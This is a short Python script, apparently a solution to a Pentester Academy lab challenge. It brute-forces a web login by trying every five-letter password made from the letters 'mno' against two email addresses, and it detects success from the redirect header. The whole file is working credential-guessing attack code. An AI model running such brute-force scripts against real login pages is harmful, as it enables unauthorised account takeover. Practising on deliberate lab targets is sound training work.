import itertools
import requests
import json

password=(list(map("".join, itertools.product('mno', repeat=5))))
email=['nick@pentesteracademy.com','admin@pentesteracademy.com']

for username in email:
	for passw in password:
		url='http://pentesteracademylab.appspot.com/lab/webapp/auth/1/loginscript?email='+username+'&password='+passw
		r=requests.head(url=url)
		if(r.headers['Location']!="http://pentesteracademylab.appspot.com/lab/webapp/auth/1/login"):
			print ("Success in brute force")
			print (username)
			print (passw)
			print ("Visit the URL to complete the challenge: ",r.headers['Location'])
			break
			
